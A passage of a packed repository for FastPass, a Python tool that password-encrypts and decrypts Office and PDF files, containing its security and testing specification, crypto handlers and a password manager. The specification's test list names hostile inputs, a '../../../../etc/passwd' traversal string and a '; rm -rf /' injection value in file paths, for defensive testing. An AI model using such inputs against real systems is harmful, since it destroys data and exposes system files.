| **Password Exposure** | Memory clearing + secure input handling | `SecurePasswordManager` |
| **Race Conditions** | Atomic operations + secure temp files | `SecureTempFileManager` |
| **XXE Injection** | XML entity detection + content validation | `validate_xml_security()` |
| **ZIP Bombs** | Compression ratio analysis + size limits | `validate_office_document_security()` |
| **Malicious PDFs** | JavaScript detection + content scanning | `validate_pdf_document_security()` |
| **Symlink Attacks** | Symlink detection + strict path resolution | `validate_path_security_hardened()` |
| **DoS Attacks** | Input size limits + resource constraints | Multiple validation functions |
| **File Format Confusion** | Magic number validation + strict matching | `validate_file_format_secure()` |

#### **Security Configuration Options**

```python
# CLI Security Flags
--allow-cwd           # Explicitly enable current directory access (default: disabled)

# Environment Variables
FASTPASS_ALLOW_CWD=false              # Default: restrict to home directory only
FASTPASS_MAX_PASSWORD_LENGTH=1024     # Password length limit
FASTPASS_MAX_JSON_SIZE=1048576        # 1MB JSON input limit
FASTPASS_ENABLE_SECURE_DELETION=true  # Overwrite files before deletion
FASTPASS_SYMLINK_PROTECTION=true      # Block symlink access
FASTPASS_XML_ENTITY_PROTECTION=true   # XXE protection enabled
```

#### **Security-First Design Principles**

1. **Principle of Least Privilege**: By default, only allow access to user home directory
2. **Defense in Depth**: Multiple layers of validation and sanitization
3. **Fail Secure**: Security violations result in immediate termination
4. **Input Validation**: All user inputs validated against strict criteria
5. **Secure by Default**: Most restrictive settings enabled by default
6. **Memory Protection**: Best-effort password clearing and secure handling
7. **Atomic Operations**: Prevent race conditions and partial state corruption
8. **Content Validation**: Deep inspection of file contents for malicious patterns

#### **Critical Security Requirements**

**MANDATORY IMPLEMENTATION**: The following security measures are not optional and must be implemented exactly as specified:

- ✅ **Path Traversal Protection**: `validate_path_security_hardened()` with symlink detection
- ✅ **Command Injection Prevention**: Direct library calls or secure subprocess with argument validation
- ✅ **Password Memory Protection**: `SecurePasswordManager` with memory clearing
- ✅ **Secure Temporary Files**: Cryptographically secure naming and restrictive permissions (0o600)
- ✅ **File Format Validation**: Magic number + extension cross-validation with attack detection
- ✅ **Input Sanitization**: All user inputs validated for length, content, and dangerous patterns
- ✅ **Error Sanitization**: No sensitive information disclosed in error messages
- ✅ **Resource Limits**: File size, path length, and processing time constraints

#### **Security Testing Requirements**

Each security measure must be tested with specific attack scenarios:

```python
# Security Test Cases (Required)
test_path_traversal_attacks()          # ../../../../etc/passwd
test_symlink_attacks()                 # Symlink to sensitive files  
test_command_injection()               # ; rm -rf / in file paths
test_password_exposure()               # Process list monitoring
test_xxe_injection()                   # XML external entity attacks
test_zip_bomb_detection()              # Compression ratio attacks
test_malicious_pdf_content()           # JavaScript/launch actions
test_race_condition_prevention()       # Concurrent file operations
test_dos_via_large_inputs()            # Oversized files and inputs
test_file_format_confusion()           # Polyglot and mismatched formats
```

#### **Security Audit Checklist**

Before deployment, verify each security control:

- [ ] Path validation blocks `../../../etc/passwd` access attempts
- [ ] Symlink access denied with clear error message  
- [ ] Subprocess calls use argument arrays, never shell execution
- [ ] Passwords not visible in `ps aux` output during processing
- [ ] JSON password input validated for size and content
- [ ] Temporary files created with 0o600 permissions
- [ ] File format mismatches rejected (e.g., .pdf with .docx magic number)
- [ ] ZIP bomb detection triggers on high compression ratios
- [ ] PDF JavaScript content blocked
- [ ] XXE entity declarations in Office documents blocked
- [ ] Memory clearing attempted for password variables
- [ ] Error messages sanitized of sensitive information

---

## Implementation Status & Next Steps

### Current Development Phase
- **Phase**: Architecture specification complete
- **Status**: Ready for implementation
- **Next Priority**: Begin implementation of Section A (CLI Parsing & Initialization)

### Implementation Order
1. **Section A**: CLI parsing and basic application structure
2. **Section B**: Security validation and file format detection  
3. **Section C**: Crypto tool integration and handler classes
4. **Section D**: File processing pipeline with error handling
5. **Section E**: Cleanup, reporting, and finalization

### Key Implementation Notes
- Each code section must be labeled with exact IDs from this specification (e.g., `# A1a`, `# B3c`)
- All error handling must follow the patterns defined in the pseudocode
- Security validations are mandatory and cannot be simplified or skipped
- Password handling must implement the complete priority system as specified
- File processing must use the secure temporary directory approach

### Comprehensive Testing Strategy

#### Unit Testing Framework
- **Framework**: pytest with coverage reporting (pytest-cov)
- **Test Structure**: Mirror source code structure in tests/ directory
- **Coverage Target**: Minimum 85% code coverage for all modules
- **Mocking**: Use unittest.mock for external dependencies and file system operations

#### Test Categories

**1. Security Testing (Critical Priority)**
```python
# tests/test_security.py
class TestPathTraversalSecurity:
    def test_reject_parent_directory_traversal(self):
        """Test rejection of '../' path traversal attempts"""
    
    def test_reject_absolute_paths_outside_allowed(self):
        """Test rejection of paths outside user home/current directory"""
    
    def test_symlink_resolution_security(self):
        """Test proper handling of symbolic links"""
    
    def test_windows_path_traversal_patterns(self):
        """Test Windows-specific path traversal patterns"""
    
    def test_url_encoded_path_injection(self):
        """Test rejection of URL-encoded traversal attempts"""

class TestPasswordSecurity:
    def test_password_memory_clearing(self):
        """Test password variables are cleared from memory"""
    
    def test_password_not_logged(self):
        """Test passwords never appear in log outputs"""
    
    def test_error_message_sanitization(self):
        """Test sensitive data removed from error messages"""

class TestFileFormatSecurity:
    def test_magic_number_validation(self):
        """Test file format detection via magic numbers"""
    
    def test_malicious_file_rejection(self):
        """Test rejection of files with mismatched extensions"""
    
    def test_large_file_rejection(self):
        """Test rejection of files exceeding size limits"""
```

**2. Crypto Handler Testing**
```python
# tests/test_crypto_handlers.py
class TestOfficeDocumentHandler:
    def test_encrypt_docx_file(self):
        """Test DOCX encryption with valid password"""
    
    def test_decrypt_protected_xlsx(self):
        """Test XLSX decryption with correct password"""
    
    def test_wrong_password_handling(self):
        """Test graceful handling of incorrect passwords"""
    
    def test_corrupted_file_detection(self):
        """Test detection and handling of corrupted Office files"""

class TestPDFHandler:
    def test_pdf_encryption_standard(self):
        """Test PDF encryption with standard security"""
    
    def test_pdf_decryption_validation(self):
        """Test PDF decryption and integrity validation"""
    
    def test_pdf_permission_handling(self):
        """Test handling of PDF permission restrictions"""
```

**3. Integration Testing**
```python
# tests/test_integration.py
class TestEndToEndWorkflows:
    def test_full_encryption_workflow(self):
        """Test complete file encryption from CLI to output"""
    
    def test_batch_processing_mixed_formats(self):
        """Test processing multiple file types in single operation"""
    
    def test_recursive_directory_processing(self):
        """Test recursive directory processing with filters"""
    
    def test_error_recovery_and_cleanup(self):
        """Test system recovery from processing errors"""

class TestPasswordManagement:
    def test_password_priority_system(self):
        """Test CLI > list file priority order"""
    
    
    def test_stdin_json_password_input(self):
        """Test JSON password input via stdin"""
```

**4. Error Handling Testing**
```python
# tests/test_error_handling.py
class TestErrorScenarios:
    def test_missing_file_handling(self):
        """Test graceful handling of missing input files"""
    
    def test_permission_denied_scenarios(self):
        """Test handling of read/write permission failures"""
    
    def test_disk_space_exhaustion(self):
        """Test behavior when disk space runs out during processing"""
    
    def test_crypto_tool_unavailable(self):
        """Test fallback when required crypto tools missing"""
    
    def test_partial_processing_cleanup(self):
        """Test cleanup of partially processed files on failure"""
```

**5. Performance Testing**
```python
# tests/test_performance.py
class TestPerformanceBenchmarks:
    def test_large_file_processing_time(self):
        """Test processing time for files up to size limit"""
    
    def test_batch_processing_scalability(self):
        """Test performance with increasing number of files"""
    
    def test_memory_usage_monitoring(self):
        """Test memory usage stays within reasonable bounds"""
```

#### Test Data Management
- **Test Fixtures**: Create representative Office/PDF files for testing
- **Encrypted Samples**: Pre-encrypted files with known passwords
- **Malicious Samples**: Files designed to test security vulnerabilities
- **Large Files**: Test files of various sizes up to the limit
- **Corrupted Files**: Intentionally corrupted files for error testing

#### Continuous Integration
- **GitHub Actions**: Run tests on multiple Python versions (3.8+)
- **Platform Testing**: Test on Windows, macOS, and Linux
- **Security Scanning**: Integrate SAST tools (bandit, safety)
- **Coverage Reporting**: Automated coverage reports and enforcement

#### Manual Testing Checklist
- **User Acceptance Testing**: Manual testing of CLI workflows
- **Cross-Platform Testing**: Verify behavior across operating systems
- **Edge Cases**: Manual testing of unusual file combinations
- **Documentation Validation**: Ensure examples in docs actually work

#### Test Execution Commands
```bash
# Run all tests with coverage
pytest tests/ --cov=src --cov-report=html --cov-report=term

# Run only security tests
pytest tests/test_security.py -v

# Run performance benchmarks
pytest tests/test_performance.py --benchmark-only

# Run integration tests
pytest tests/test_integration.py -v
```

### Implementation Quality Gates

**Phase 1 - Security Foundation (Must Pass)**
- All security tests pass (path traversal, file validation, password handling)
- Error message sanitization verified
- Temporary file cleanup confirmed

**Phase 2 - Core Functionality (Must Pass)**  
- All crypto handler tests pass
- File processing pipeline tests pass
- Configuration management tests pass

**Phase 3 - Integration & Performance (Must Pass)**
- End-to-end workflow tests pass
- Performance benchmarks meet targets
- Error recovery tests pass

**Phase 4 - Production Readiness (Must Pass)**
- 85%+ code coverage achieved
- All manual test scenarios pass
- Documentation examples verified

---

This specification serves as the complete blueprint for FastPass implementation. All code must conform to this architecture, implement the exact pseudocode patterns shown above, and pass the comprehensive testing strategy before deployment.
</file>

</files>
</file>

<file path="main.py">
#!/usr/bin/env python3
"""
Main application entry point
"""

import sys
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent / "src"))

def main():
    """Main function"""
    print("Hello from your new Python project!")
    print(f"Project root: {Path(__file__).parent}")
    
    # Your application logic goes here
    pass

if __name__ == "__main__":
    main()
</file>

<file path="scripts/create_test_pdf.py">
#!/usr/bin/env python3
"""
Create a simple test PDF file for FastPass testing
"""

try:
    from reportlab.pdfgen import canvas
    from reportlab.lib.pagesizes import letter
    import sys
    from pathlib import Path
    
    def create_test_pdf(output_path: str):
        """Create a simple test PDF"""
        c = canvas.Canvas(output_path, pagesize=letter)
        
        # Add some content
        c.drawString(100, 750, "FastPass Test Document")
        c.drawString(100, 720, "This is a test PDF for FastPass encryption/decryption testing.")
        c.drawString(100, 690, "Created for testing purposes only.")
        
        # Add a second page
        c.showPage()
        c.drawString(100, 750, "Page 2 of Test Document")
        c.drawString(100, 720, "Additional content for testing multi-page PDFs.")
        
        c.save()
        print(f"Test PDF created: {output_path}")
    
    if __name__ == "__main__":
        output_file = Path(__file__).parent.parent / "test_sample.pdf"
        create_test_pdf(str(output_file))
        
except ImportError:
    # Fallback: create a minimal PDF manually
    import sys
    from pathlib import Path
    
    def create_minimal_pdf(output_path: str):
        """Create minimal PDF without reportlab"""
        # Very basic PDF structure
        pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(FastPass Test PDF) Tj
ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000216 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
310
%%EOF"""
        
        with open(output_path, 'w') as f:
            f.write(pdf_content)
        print(f"Minimal test PDF created: {output_path}")
    
    if __name__ == "__main__":
        output_file = Path(__file__).parent.parent / "test_sample.pdf"
        create_minimal_pdf(str(output_file))
</file>

<file path="scripts/run_tests.py">
#!/usr/bin/env python3
"""
FastPass Test Runner
Executes comprehensive test suite with reporting
Maps to: test_runner.py from test design document
"""

import subprocess
import sys
import time
from pathlib import Path


def run_test_suite():
    """Run complete test suite with coverage reporting"""
    
    print("Starting FastPass Comprehensive Test Suite")
    print("=" * 60)
    
    start_time = time.time()
    
    # Test execution phases
    test_phases = [
        ("CLI Basic Tests", "tests/test_cli_basic.py"),
        ("Integration Tests", "tests/test_integration_basic.py"),
    ]
    
    total_results = {
        "passed": 0,
        "failed": 0,
        "skipped": 0
    }
    
    for phase_name, test_path in test_phases:
        print(f"\nRunning {phase_name}")
        print("-" * 40)
        
        cmd = [
            "uv", "run", "python", "-m", "pytest",
            test_path,
            "-v",
            "--tb=short", 
            "--cov=src",
            "--cov-report=term-missing"
        ]
        
        try:
            result = subprocess.run(cmd, cwd=Path(__file__).parent.parent)
            
            if result.returncode == 0:
                print(f"SUCCESS: {phase_name} PASSED")
                total_results["passed"] += 1
            else:
                print(f"FAILED: {phase_name} FAILED")
                total_results["failed"] += 1
                
        except Exception as e:
            print(f"ERROR: {phase_name} ERROR: {e}")
            total_results["failed"] += 1
    
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\nTest Suite Complete")
    print(f"Total Duration: {duration:.2f} seconds")
    print(f"Results: {total_results['passed']} passed, {total_results['failed']} failed, {total_results['skipped']} skipped")
    
    # Return exit code
    return 0 if total_results["failed"] == 0 else 1


def run_all_tests():
    """Run all tests with coverage"""
    print("Running All FastPass Tests")
    print("=" * 50)
    
    cmd = [
        "uv", "run", "python", "-m", "pytest",
        "tests/",
        "-v",
        "--cov=src",
        "--cov-report=term-missing",
        "--cov-report=html:reports/coverage/"
    ]
    
    try:
        # Ensure reports directory exists
        reports_dir = Path(__file__).parent.parent / "reports"
        reports_dir.mkdir(exist_ok=True)
        
        result = subprocess.run(cmd, cwd=Path(__file__).parent.parent)
        
        if result.returncode == 0:
            print("\nSUCCESS: All tests passed!")
            print("Coverage report: reports/coverage/index.html")
        else:
            print("\nFAILED: Some tests failed!")
        
        return result.returncode
        
    except Exception as e:
        print(f"ERROR: Error running tests: {e}")
        return 1


def demo_functionality():
    """Demonstrate FastPass functionality"""
    print("FastPass Functionality Demo")
    print("=" * 40)
    
    base_dir = Path(__file__).parent.parent
    
    # Demo commands
    demos = [
        ("Show supported formats", ["--list-supported"]),
        ("Show version", ["--version"]),
        ("Show help", ["--help"]),
    ]
    
    for demo_name, args in demos:
        print(f"\n{demo_name}:")
        print("-" * len(demo_name))
        
        cmd = ["uv", "run", "python", "-m", "src"] + args
        
        try:
            result = subprocess.run(cmd, cwd=base_dir, capture_output=True, text=True)
            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print("STDERR:", result.stderr)
        except Exception as e:
            print(f"Error: {e}")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "demo":
            demo_functionality()
        elif sys.argv[1] == "all":
            sys.exit(run_all_tests())
        elif sys.argv[1] == "suite":
            sys.exit(run_test_suite())
        else:
            print("Usage: python run_tests.py [demo|all|suite]")
            sys.exit(1)
    else:
        # Default: run all tests
        sys.exit(run_all_tests())
</file>

<file path="src/__main__.py">
#!/usr/bin/env python3
"""
FastPass - Universal File Encryption/Decryption Tool

Makes package executable with 'python -m src'
Entry point: MAIN PROGRAM ENTRY POINT
"""

# A1a: Load System Tools
import sys
import os
from pathlib import Path

# Add src directory to path for imports
src_path = Path(__file__).parent
if str(src_path) not in sys.path:
    sys.path.insert(0, str(src_path))

def main():
    """FastPass main entry point with complete error handling"""
    from cli import main as cli_main
    return cli_main()

if __name__ == "__main__":
    # Program Startup - FastPass application begins execution
    sys.exit(main())
</file>

<file path="src/core/__init__.py">
"""
FastPass Core Business Logic
"""

from .security import SecurityValidator
from .file_handler import FileValidator, FileProcessor, ResultsReporter

__all__ = ['SecurityValidator', 'FileValidator', 'FileProcessor', 'ResultsReporter']
</file>

<file path="src/core/crypto_handlers/__init__.py">
"""
FastPass Crypto Tool Integrations
"""

from .office_handler import OfficeDocumentHandler
from .pdf_handler import PDFHandler

__all__ = ['OfficeDocumentHandler', 'PDFHandler']
</file>

<file path="src/core/crypto_handlers/office_handler.py">
"""
FastPass Office Document Handler
Maps to: C1c_Office, C2a_Config - msoffcrypto-tool integration
"""

# A1a: Load System Tools
import logging
from pathlib import Path
from typing import Dict, Any
import tempfile
import shutil

try:
    import msoffcrypto
except ImportError:
    msoffcrypto = None


class OfficeDocumentHandler:
    """
    Microsoft Office document encryption/decryption handler
    Uses msoffcrypto-tool for crypto operations
    """
    
    def __init__(self, logger: logging.Logger):
        self.logger = logger
        
        if msoffcrypto is None:
            raise ImportError("msoffcrypto-tool is required for Office document processing")
        
        # C2a_Config: Configure Office Settings
        self.timeout = 30
        self.encryption_algorithm = 'AES-256'
        
        self.logger.debug("Office document handler initialized")
    
    def configure(self, config: Dict[str, Any]) -> None:
        """
        C2a: Configure Office Handler
        Set Office-specific configuration options
        """
        self.timeout = config.get('office_timeout', self.timeout)
        
        # Log experimental encryption warning
        if config.get('debug', False):
            self.logger.warning(
                "Office document encryption is EXPERIMENTAL. "
                "Decryption is fully supported."
            )
    
    def test_password(self, file_path: Path, password: str) -> bool:
        """
        Test if password works for Office document
        Returns True if password is correct, False otherwise
        """
        try:
            with open(file_path, 'rb') as f:
                office_file = msoffcrypto.OfficeFile(f)
                
                if not office_file.is_encrypted():
                    # File is not encrypted, so any password "works" for decryption
                    return True
                
                # Try to load with password
                office_file.load_key(password=password)
                
                # Try to decrypt a small portion to verify password
                with tempfile.NamedTemporaryFile() as temp_file:
                    office_file.decrypt(temp_file)
                    temp_file.seek(0)
                    # If we can read some data, password is correct
                    data = temp_file.read(100)
                    return len(data) > 0
                    
        except Exception as e:
            self.logger.debug(f"Password test failed for {file_path}: {e}")
            return False
    
    def encrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """
        Encrypt Office document with password
        Note: This is experimental functionality
        """
        
        # Log experimental warning
        self.logger.warning(
            f"EXPERIMENTAL: Encrypting {input_path.name} with Office encryption"
        )
        
        try:
            # For Office encryption, we need to use a different approach
            # msoffcrypto-tool primarily supports decryption
            # For encryption, we would need to use Office automation or other tools
            
            # This is a placeholder implementation
            # In a real implementation, you might use:
            # - Office COM automation (Windows only)
            # - LibreOffice command line tools
            # - Or other encryption methods
            
            raise NotImplementedError(
                "Office document encryption is not yet implemented. "
                "Use Microsoft Office or LibreOffice to encrypt documents manually."
            )
            
        except Exception as e:
            raise Exception(f"Failed to encrypt Office document {input_path}: {e}")
    
    def decrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """
        Decrypt Office document with password
        Full decryption support using msoffcrypto-tool
        """
        try:
            with open(input_path, 'rb') as f:
                office_file = msoffcrypto.OfficeFile(f)
                
                if not office_file.is_encrypted():
                    # File is not encrypted, just copy it
                    shutil.copy2(input_path, output_path)
                    self.logger.info(f"File {input_path.name} was not encrypted, copied as-is")
                    return
                
                # Load the password
                office_file.load_key(password=password)
                
                # Decrypt to output file
                with open(output_path, 'wb') as output_file:
                    office_file.decrypt(output_file)
                
                self.logger.info(f"Successfully decrypted {input_path.name}")
                
        except Exception as e:
            raise Exception(f"Failed to decrypt Office document {input_path}: {e}")
    
    def cleanup(self) -> None:
        """
        E2d: Call Handler Cleanup
        Clean up any handler-specific resources
        """
        # Office handler doesn't maintain persistent resources
        pass
</file>

<file path="src/core/crypto_handlers/pdf_handler.py">
"""
FastPass PDF Handler
Maps to: C1d_PDF, C2b_Config - PyPDF2 integration
"""

# A1a: Load System Tools
import logging
from pathlib import Path
from typing import Dict, Any

try:
    import PyPDF2
except ImportError:
    PyPDF2 = None


class PDFHandler:
    """
    PDF document encryption/decryption handler
    Uses PyPDF2 for crypto operations
    """
    
    def __init__(self, logger: logging.Logger):
        self.logger = logger
        
        if PyPDF2 is None:
            raise ImportError("PyPDF2 is required for PDF document processing")
        
        # C2b_Config: Configure PDF Settings
        self.encryption_method = 'AES-256'
        self.user_password_length = 128
        
        self.logger.debug("PDF handler initialized")
    
    def configure(self, config: Dict[str, Any]) -> None:
        """
        C2b: Configure PDF Handler
        Set PDF-specific configuration options
        """
        self.encryption_method = config.get('pdf_encryption_method', self.encryption_method)
        self.user_password_length = config.get('pdf_password_length', self.user_password_length)
    
    def test_password(self, file_path: Path, password: str) -> bool:
        """
        Test if password works for PDF document
        Returns True if password is correct, False otherwise
        """
        try:
            with open(file_path, 'rb') as f:
                pdf_reader = PyPDF2.PdfReader(f)
                
                if not pdf_reader.is_encrypted:
                    # PDF is not encrypted, so any password "works" for decryption
                    return True
                
                # Try to decrypt with password
                result = pdf_reader.decrypt(password)
                
                # PyPDF2 returns:
                # 0: Failed
                # 1: Succeeded with user password
                # 2: Succeeded with owner password
                return result > 0
                
        except Exception as e:
            self.logger.debug(f"Password test failed for {file_path}: {e}")
            return False
    
    def encrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """
        Encrypt PDF document with password
        Full encryption support using PyPDF2
        """
        try:
            with open(input_path, 'rb') as input_file:
                pdf_reader = PyPDF2.PdfReader(input_file)
                pdf_writer = PyPDF2.PdfWriter()
                
                # Copy all pages from input to output
                for page_num in range(len(pdf_reader.pages)):
                    page = pdf_reader.pages[page_num]
                    pdf_writer.add_page(page)
                
                # Encrypt the PDF with password
                pdf_writer.encrypt(
                    user_password=password,
                    owner_password=password,  # Use same password for both
                    use_128bit=True
                )
                
                # Write encrypted PDF to output file
                with open(output_path, 'wb') as output_file:
                    pdf_writer.write(output_file)
                
                self.logger.info(f"Successfully encrypted {input_path.name}")
                
        except Exception as e:
            raise Exception(f"Failed to encrypt PDF {input_path}: {e}")
    
    def decrypt_file(self, input_path: Path, output_path: Path, password: str) -> None:
        """
        Decrypt PDF document with password
        Full decryption support using PyPDF2
        """
        try:
            with open(input_path, 'rb') as input_file:
                pdf_reader = PyPDF2.PdfReader(input_file)
                
                if not pdf_reader.is_encrypted:
                    # PDF is not encrypted, just copy it
                    import shutil
                    shutil.copy2(input_path, output_path)
                    self.logger.info(f"PDF {input_path.name} was not encrypted, copied as-is")
                    return
                
                # Decrypt with password
                decrypt_result = pdf_reader.decrypt(password)
                if decrypt_result == 0:
                    raise Exception(f"Incorrect password for PDF {input_path}")
                
                # Create writer and copy all pages
                pdf_writer = PyPDF2.PdfWriter()
                
                for page_num in range(len(pdf_reader.pages)):
                    page = pdf_reader.pages[page_num]
                    pdf_writer.add_page(page)
                
                # Write decrypted PDF to output file
                with open(output_path, 'wb') as output_file:
                    pdf_writer.write(output_file)
                
                self.logger.info(f"Successfully decrypted {input_path.name}")
                
        except Exception as e:
            raise Exception(f"Failed to decrypt PDF {input_path}: {e}")
    
    def cleanup(self) -> None:
        """
        E2d: Call Handler Cleanup
        Clean up any handler-specific resources
        """
        # PDF handler doesn't maintain persistent resources
        pass
</file>

<file path="src/core/password/__init__.py">
"""
FastPass Password Handling Modules
"""

from .password_manager import PasswordManager

__all__ = ['PasswordManager']
</file>

<file path="src/core/password/password_manager.py">
"""
FastPass Password Management System
Maps to: C3a-C5d Password Management and Testing from flowchart
"""

# A1a: Load System Tools
from pathlib import Path
from typing import List, Optional, Dict, Any
import logging


class PasswordManager:
    """
    Password handling with multiple sources and priority algorithm
    Maps to: C3a-C5d from flowchart
    """
    
    def __init__(self, cli_passwords: List[str] = None, 
                 password_list_file: Optional[Path] = None,
                 stdin_mapping: Optional[Dict[str, str]] = None):
        """
        C3a-C3c: Initialize PasswordManager Class
        Set up password storage and management
        """
        
        # C3b: Remember User's Passwords
        self.cli_passwords = cli_passwords or []
        self.password_list_file = password_list_file
        self.stdin_mapping = stdin_mapping or {}
        
        # C3c: Prepare Password Storage
        self.password_list = []
        
        # C3d: Load Passwords from File
        if self.password_list_file:
            self._load_password_list()
    
    def _load_password_list(self) -> None:
        """
        C3d_Load: Read Passwords from File
        Load passwords from text file, one per line
        """
        try:
            with open(self.password_list_file, 'r', encoding='utf-8') as f:
                self.password_list = [line.strip() for line in f if line.strip()]
            
            # C3d_Load_Success: Passwords Successfully Loaded
            print(f"Loaded {len(self.password_list)} passwords from file")
            
        except FileNotFoundError:
            # C3d_Load_Error: Cannot Read Password File
            print(f"Warning: Password list file not found: {self.password_list_file}")
            self.password_list = []
        except Exception as e:
            print(f"Warning: Error reading password file {self.password_list_file}: {e}")
            self.password_list = []
    
    def get_password_candidates(self, file_path: Path) -> List[str]:
        """
        C4a-C4e: Get prioritized list of passwords to try for a file
        Build password list with priority ordering
        """
        
        # C4a: Start Building Password List
        candidates = []
        
        # Check for file-specific password from stdin mapping
        if self.stdin_mapping:
            file_name = file_path.name
            if file_name in self.stdin_mapping:
                candidates.append(self.stdin_mapping[file_name])
        
        # C4b: Add Command-Line Passwords First
        # Put passwords user typed in command first
        candidates.extend(self.cli_passwords)
        
        # C4c: Add File Passwords Second
        # Add passwords from password file after command-line ones
        candidates.extend(self.password_list)
        
        # C4d: Remove Duplicate Passwords
        # Eliminate passwords that appear multiple times
        seen = set()
        unique_candidates = []
        
        # C4d_Loop: Check Each Password for Duplicates
        for password in candidates:
            if password not in seen:
                # C4d_Add: Add New Password to List
                seen.add(password)
                unique_candidates.append(password)
        
        # C4e: Finalize Password List
        return unique_candidates
    
    def find_working_password(self, file_path: Path, crypto_handler) -> Optional[str]:
        """
        C5a-C5d: Find working password for file by trying all candidates
        Password testing mechanism
        """
        
        # C5a-C5b: Set Up Password Testing System and get passwords
        candidates = self.get_password_candidates(file_path)
        
        if not candidates:
            return None
        
        # C5c-C5d: Begin Trying Passwords
        for password in candidates:
            try:
                # C5d: Try Current Password
                if crypto_handler.test_password(file_path, password):
                    # C5d_Success: Found Working Password
                    return password
                    
            except Exception as e:
                # Continue trying other passwords
                continue
        
        # C5d_Failed: No Password Works
        return None
    
    def clear_passwords(self) -> None:
        """
        E3a-E3d: Clear passwords from memory for security
        Overwrite password memory
        """
        
        # E3a_Loop: Overwrite Password Memory
        if self.cli_passwords:
            for i in range(len(self.cli_passwords)):
                if self.cli_passwords[i]:
                    # E3a_Overwrite: Overwrite Password
                    self.cli_passwords[i] = 'X' * len(self.cli_passwords[i])
            self.cli_passwords.clear()
        
        if self.password_list:
            for i in range(len(self.password_list)):
                if self.password_list[i]:
                    self.password_list[i] = 'X' * len(self.password_list[i])
            self.password_list.clear()
        
        if self.stdin_mapping:
            for key in self.stdin_mapping:
                if self.stdin_mapping[key]:
                    self.stdin_mapping[key] = 'X' * len(self.stdin_mapping[key])
            self.stdin_mapping.clear()
        
        # E3c: Force Garbage Collection
        import gc
        gc.collect()
</file>

<file path="src/exceptions.py">
"""
FastPass Exception Classes
Centralized exception definitions for all FastPass modules
"""


class SecurityViolationError(Exception):
    """Raised when security validation fails"""
    pass


class FileFormatError(Exception):
    """Raised when file format validation fails"""
    pass


class CryptoToolError(Exception):
    """Raised when crypto tools are unavailable"""
    pass


class PasswordError(Exception):
    """Raised when password operations fail"""
    pass


class FileProcessingError(Exception):
    """Raised when file processing fails (file not found, access issues, etc.)"""
    pass


class ProcessingError(Exception):
    """Raised when file processing fails"""
    pass
</file>

<file path="src/utils/__init__.py">
"""
FastPass Utility Modules
"""

from .config import FastPassConfig
from .logger import setup_logger

__all__ = ['FastPassConfig', 'setup_logger']
</file>

<file path="src/utils/config.py">
"""
FastPass Configuration Management System
Maps to: CONFIGURATION MANAGEMENT SYSTEM from flowchart
"""

# A1a: Load System Tools
import json
import os
from pathlib import Path
from typing import Dict, Any
import argparse


class FastPassConfig:
    """Configuration management with multiple sources and precedence"""
    
    # CONFIGURATION MANAGEMENT SYSTEM constants
    VERSION = "1.0.0"
    MAX_FILE_SIZE = 500 * 1024 * 1024  # 500MB
    TEMP_DIR_PREFIX = "fastpass_"
    SECURE_FILE_PERMISSIONS = 0o600
    SUPPORTED_FORMATS = {
        '.docx': 'msoffcrypto',
        '.xlsx': 'msoffcrypto', 
        '.pptx': 'msoffcrypto',
        '.docm': 'msoffcrypto',
        '.xlsm': 'msoffcrypto',
        '.pptm': 'msoffcrypto',
        '.dotx': 'msoffcrypto',
        '.xltx': 'msoffcrypto',
        '.potx': 'msoffcrypto',
        '.pdf': 'PyPDF2'
    }
    
    # Configuration file locations (in order of precedence)
    CONFIG_LOCATIONS = [
        Path.home() / '.fastpass' / 'config.json',  # User config
        Path.cwd() / 'fastpass.json',               # Project config
        Path(__file__).parent.parent / 'config.json'  # Default config
    ]
    
    @classmethod
    def load_configuration(cls, cli_args: argparse.Namespace) -> Dict[str, Any]:
        """Load configuration from multiple sources with precedence"""
        config = cls._get_default_config()
        
        # 1. Load from config files (lowest precedence)
        for config_path in cls.CONFIG_LOCATIONS:
            if config_path.exists():
                try:
                    with open(config_path, 'r') as f:
                        file_config = json.load(f)
                        config.update(file_config)
                except (json.JSONDecodeError, IOError) as e:
                    print(f"Warning: Could not load config from {config_path}: {e}")
        
        # 2. Load from environment variables
        env_config = cls._load_from_environment()
        config.update(env_config)
        
        # 3. Override with CLI arguments (highest precedence)
        cli_config = cls._extract_cli_config(cli_args)
        config.update(cli_config)
        
        return config
    
    @classmethod
    def _get_default_config(cls) -> Dict[str, Any]:
        """Default configuration values"""
        return {
            'max_file_size': cls.MAX_FILE_SIZE,
            'temp_dir_prefix': cls.TEMP_DIR_PREFIX,
            'secure_permissions': cls.SECURE_FILE_PERMISSIONS,
            'supported_formats': cls.SUPPORTED_FORMATS.copy(),
            'debug': False,
            'verify': False,
            'dry_run': False
        }
    
    @classmethod
    def _load_from_environment(cls) -> Dict[str, Any]:
        """Load configuration from environment variables"""
        env_config = {}
        
        # Check for FASTPASS_* environment variables
        if os.getenv('FASTPASS_DEBUG'):
            env_config['debug'] = os.getenv('FASTPASS_DEBUG').lower() in ('1', 'true', 'yes')
        
        if os.getenv('FASTPASS_MAX_FILE_SIZE'):
            try:
                env_config['max_file_size'] = int(os.getenv('FASTPASS_MAX_FILE_SIZE'))
            except ValueError:
                pass
        
        return env_config
    
    @classmethod
    def _extract_cli_config(cls, cli_args: argparse.Namespace) -> Dict[str, Any]:
        """Extract configuration from CLI arguments"""
        cli_config = {}
        
        if hasattr(cli_args, 'debug') and cli_args.debug:
            cli_config['debug'] = True
        
        if hasattr(cli_args, 'verify') and cli_args.verify:
            cli_config['verify'] = True
            
        if hasattr(cli_args, 'dry_run') and cli_args.dry_run:
            cli_config['dry_run'] = True
        
        return cli_config
</file>

<file path="test_sample.txt">
This is a test file for FastPass functionality testing.
</file>

<file path="tests/e2e/__init__.py">
